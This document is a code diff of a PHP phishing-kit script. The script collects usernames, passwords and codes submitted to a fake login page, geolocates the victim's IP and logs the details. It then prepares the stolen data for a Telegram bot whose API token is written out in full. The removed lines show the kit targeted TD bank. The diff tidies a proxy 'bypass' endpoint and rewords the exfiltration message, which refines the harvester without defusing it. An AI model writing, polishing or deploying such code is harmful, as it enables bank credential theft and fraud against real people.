@@ -1,43 +1,60 @@
 <?php
+// Enable error reporting and display errors (remove these lines in production)
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
 
+// Set security-related headers
 header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
-header("X-XSS-Protection: 0");
-header("X-Frame-Options: ALLOWALL");
-header("Access-Control-Allow-Origin: *");
-header("Access-Control-Allow-Credentials: true");
-header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
-header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");
+header("X-XSS-Protection: 1; mode=block");
+header("X-Frame-Options: DENY");
+header("Referrer-Policy: strict-origin-when-cross-origin");
 
-if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
-    $url = $_GET['url'];
+// Validate and sanitize input parameters
+$bypass = isset($_GET['bypass']) && $_GET['bypass'] === 'true';
+$url = $bypass ? filter_input(INPUT_GET, 'url', FILTER_SANITIZE_URL) : null;
+
+// Handle bypass request
+if ($bypass && $url !== null) {
+    // Validate and sanitize URL
+    $url = filter_var($url, FILTER_VALIDATE_URL);
+    if ($url === false) {
+        header("HTTP/1.1 400 Bad Request");
+        exit("Invalid URL");
+    }
+
+    // Create cURL request to fetch the URL
     $ch = curl_init($url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_HEADER, false);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
-    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+
+    // Set additional headers for the cURL request
+    $curlHeaders = array(
         "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
-        "X-XSS-Protection: 0",
-        "X-Frame-Options: ALLOWALL",
-        "Access-Control-Allow-Origin: *",
-        "Access-Control-Allow-Credentials: true",
-        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
-        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
-    ));
+        "X-XSS-Protection: 1; mode=block",
+        "X-Frame-Options: DENY",
+        "Referrer-Policy: strict-origin-when-cross-origin"
+    );
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $curlHeaders);
+
+    // Execute the cURL request
     $response = curl_exec($ch);
     $info = curl_getinfo($ch);
     curl_close($ch);
 
-    header("HTTP/1.1 ".$info['http_code']);
+    // Set response headers
+    header("HTTP/1.1 " . $info['http_code']);
     foreach ($info['headers'] as $header) {
         if (!preg_match('/^Transfer-Encoding:/i', $header)) {
             header($header);
         }
     }
+
+    // Output the response
     echo $response;
     exit;
 }
-
 
 
 
@@ -157,30 +174,27 @@ if (strpos($PublicIP, $localHost) !== false) {
 else {
     $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
 }
-$details  = json_decode($details, true);
-$success  = $details['success'];
+$details = json_decode($details, true);
+$success = $details['success'];
 $fp = fopen($file, 'a');
 
-if ($success==false) {
-    fwrite($fp, $ip."\n");
-    fwrite($fp, $uos."\n");
-    fwrite($fp, $version."\n");
-    fwrite($fp, $bsr."\n");
+if ($success == false) {
+    fwrite($fp, $ip . "\n");
+    fwrite($fp, $uos . "\n");
+    fwrite($fp, $version . "\n");
+    fwrite($fp, $bsr . "\n");
     fclose($fp);
-} else if ($success==true) {
-    $country    = $details['country'];
-    $city       = $details['city'];
-    $continent  = $details['continent'];
-    $tp         = $details['type'];
-    $cn         = $details['country_phone'];
-    $is         = $details['isp'];
+} else if ($success == true) {
+    $country = $details['country'];
+    $city = $details['city'];
+    $continent = $details['continent'];
+    $tp = $details['type'];
+    $cn = $details['country_phone'];
+    $is = $details['isp'];
     $la         = $details['latitude'];
     $lp         = $details['longitude'];
     $crn        = $details['currency'];
     $type       = $tp;
-    $bank       = "TD";
-
-    $url        = "https://TD.com";
     $user       = $_POST['username'];
     $pass       = $_POST['password'];
     $code       = $_POST['code']; 
@@ -200,7 +214,7 @@ if ($success==false) {
 
 
 
-$message =" $bank$lh$ip\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$user\n\n----------------\n\n$pass\n\n---------------------\n\n";
+$message =" $ip$lh$is$lh$uos\n\n///////////////////\n\n\n$user\n\n\n\n$pass\n\n---------------------\n\n";
 
 $apiToken ="5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
 $data = [
